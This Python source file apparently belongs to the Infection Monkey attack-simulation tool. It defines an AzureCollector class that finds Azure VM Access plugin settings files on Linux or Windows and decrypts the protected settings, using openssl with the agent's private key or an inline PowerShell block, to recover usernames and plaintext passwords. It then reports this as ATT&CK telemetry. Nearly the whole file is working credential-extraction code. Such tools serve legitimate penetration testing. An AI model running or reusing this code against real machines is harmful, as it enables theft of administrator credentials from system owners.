import glob
import json
import logging
import os.path
import subprocess
import sys

from common.utils.attack_utils import ScanStatus
from infection_monkey.telemetry.attack.t1005_telem import T1005Telem
from infection_monkey.telemetry.attack.t1064_telem import T1064Telem

__author__ = 'danielg'

LOG = logging.getLogger(__name__)


class AzureCollector(object):
    """
    Extract credentials possibly saved on Azure VM instances by the VM Access plugin
    """

    def __init__(self):
        if sys.platform.startswith("win"):
            self.path = "C:\\Packages\\Plugins\\Microsoft.Compute.VmAccessAgent\\2.4.2\\RuntimeSettings"
            self.extractor = AzureCollector.get_pass_windows
        else:
            self.path = "/var/lib/waagent/Microsoft.OSTCExtensions.VMAccessForLinux-1.4.7.1/config"
            self.extractor = AzureCollector.get_pass_linux
        self.file_list = glob.iglob(os.path.join(self.path, "*.settings"))

    def extract_stored_credentials(self):
        """
        Returns a list of username/password pairs saved under configuration files
        :return: List of (user/pass), possibly empty
        """
        results = [self.extractor(filepath) for filepath in self.file_list]
        results = [x for x in results if x]
        LOG.info("Found %d Azure VM access configuration file", len(results))
        return results

    @staticmethod
    def get_pass_linux(filepath):
        """
        Extract passwords from Linux azure VM Access files
        :return: Username, password
        """
        linux_cert_store = "/var/lib/waagent/"
        try:
            json_data = json.load(open(filepath, 'r'))
            # this is liable to change but seems to be stable over the last year
            protected_data = json_data['runtimeSettings'][0]['handlerSettings']['protectedSettings']
            cert_thumbprint = json_data['runtimeSettings'][0]['handlerSettings']['protectedSettingsCertThumbprint']
            base64_command = """openssl base64 -d -a"""
            priv_path = os.path.join(linux_cert_store, "%s.prv" % cert_thumbprint)
            b64_proc = subprocess.Popen(base64_command.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            b64_result = b64_proc.communicate(input=protected_data + "\n")[0]
            decrypt_command = 'openssl smime -inform DER -decrypt -inkey %s' % priv_path
            decrypt_proc = subprocess.Popen(decrypt_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            decrypt_raw = decrypt_proc.communicate(input=b64_result)[0]
            decrypt_data = json.loads(decrypt_raw)
            T1005Telem(ScanStatus.USED, 'Azure credentials', "Path: %s" % filepath).send()
            T1064Telem(ScanStatus.USED, 'Bash scripts used to extract azure credentials.').send()
            return decrypt_data['username'], decrypt_data['password']
        except IOError:
            LOG.warning("Failed to parse VM Access plugin file. Could not open file")
            return None
        except (KeyError, ValueError):
            LOG.warning("Failed to parse VM Access plugin file. Invalid format")
            return None
        except subprocess.CalledProcessError:
            LOG.warning("Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data")
            return None

    @staticmethod
    def get_pass_windows(filepath):
        """
        Extract passwords from Windows azure VM Access files
        :return: Username,password
        """
        try:
            json_data = json.load(open(filepath, 'r'))
            # this is liable to change but seems to be stable over the last year
            protected_data = json_data['runtimeSettings'][0]['handlerSettings']['protectedSettings']
            username = json_data['runtimeSettings'][0]['handlerSettings']['publicSettings']['UserName']
            # we're going to do as much of this in PS as we can.
            ps_block = ";\n".join([
                '[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null',
                '$base64 = "%s"' % protected_data,
                "$content = [Convert]::FromBase64String($base64)",
                "$env = New-Object Security.Cryptography.Pkcs.EnvelopedCms",
                "$env.Decode($content)",
                "$env.Decrypt()",
                "$utf8content = [text.encoding]::UTF8.getstring($env.ContentInfo.Content)",
                "Write-Host $utf8content"  # we want to simplify parsing
            ])
            ps_proc = subprocess.Popen(["powershell.exe", "-NoLogo"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            ps_out = ps_proc.communicate(ps_block)[0]
            # this is disgusting but the alternative is writing the file to disk...
            password_raw = ps_out.split('\n')[-2].split(">")[1].split("$utf8content")[1]
            password = json.loads(password_raw)["Password"]
            T1005Telem(ScanStatus.USED, 'Azure credentials', "Path: %s" % filepath).send()
            T1064Telem(ScanStatus.USED, 'Powershell scripts used to extract azure credentials.').send()
            return username, password
        except IOError:
            LOG.warning("Failed to parse VM Access plugin file. Could not open file")
            return None
        except (KeyError, ValueError, IndexError):
            LOG.warning("Failed to parse VM Access plugin file. Invalid format")
            return None
        except subprocess.CalledProcessError:
            LOG.warning("Failed to decrypt VM Access plugin file. Failed to decode B64 and decrypt data")
            return None
